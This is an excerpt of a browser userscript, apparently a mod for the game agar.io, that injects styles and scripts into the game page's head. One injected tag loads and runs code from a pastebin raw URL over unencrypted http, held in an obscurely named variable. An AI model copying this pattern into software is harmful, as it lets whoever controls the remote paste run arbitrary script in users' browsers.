...
// @connect      agar.io
// @downloadURL https://update.greasyfork.org/scripts/21380/OGARio-%20TVN%20v2G.user.js
// @updateURL https://update.greasyfork.org/scripts/21380/OGARio-%20TVN%20v2G.meta.js
// ==/UserScript==
...
var edit ='<style>#clantag.privateModeK,#region.privateModeK,#joinPartyToken.privateModeK{text-indent:-99999px!important;}</style>';
var Dyx ='<script src="http://pastebin.com/raw/mjYU8xhf" charset="utf-8"></script>';
function inject(page) {
    var _page = page.replace("</head>", cpickerCSS + toastrCSS + ogarioCSS + cpickerJS + toastrJS + ogarioSniffJS + Dyx + edit +  "</head>");
